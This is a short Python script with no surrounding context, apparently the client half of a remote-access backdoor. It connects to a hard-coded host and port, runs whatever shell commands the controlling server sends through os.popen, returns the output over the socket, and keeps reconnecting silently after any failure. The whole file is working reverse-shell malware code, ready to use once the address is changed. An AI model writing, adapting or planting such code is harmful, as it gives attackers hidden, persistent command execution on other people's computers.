import socket
import json
import time
import os

def exec_shell(server, command):
    console_return = "".join(os.popen(command).readlines())
    send_data = json.dumps({
                'type': 'data',
                'content': console_return
            }).encode()
    server.send(json.dumps({
        'type': 'length',
        'content': len(send_data)
    }).encode())
    while True:
        recv_data = server.recv(2048).decode()
        json_data = json.loads(recv_data)
        if json_data['type'] == 'okay':
            server.send(send_data)
            break
        else:
            continue


def tcpClient(client):
    while True:
        try:
            recv_data = client.recv(2048).decode()
            json_data = json.loads(recv_data)
            match json_data['type']:
                case 'heartbeat':
                    continue
                case 'shell':
                    exec_shell(client, json_data['content'])
        except:
            client.close()
            connect()
            return


def connect():
    host = '127.0.0.1'
    port = 8088
    try:
        client = socket.socket()
        client.connect((host, port))
        print('server connected')
        tcpClient(client)
    except:
        time.sleep(1)
        connect()


if __name__ == '__main__':
    connect()
